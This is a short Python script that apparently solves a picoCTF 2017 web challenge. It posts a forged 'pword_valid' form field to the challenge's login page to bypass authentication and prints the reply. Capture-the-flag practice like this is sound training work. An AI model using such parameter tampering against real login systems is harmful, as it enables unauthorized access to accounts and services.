import requests

addr = 'http://shell2017.picoctf.com:4370/login'
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    'User-Agent':'Mozilla/5.0'
}
params = 'pword_valid=test'
resp = requests.post(addr, headers=headers, data=params)
print resp.text.encode('utf-8')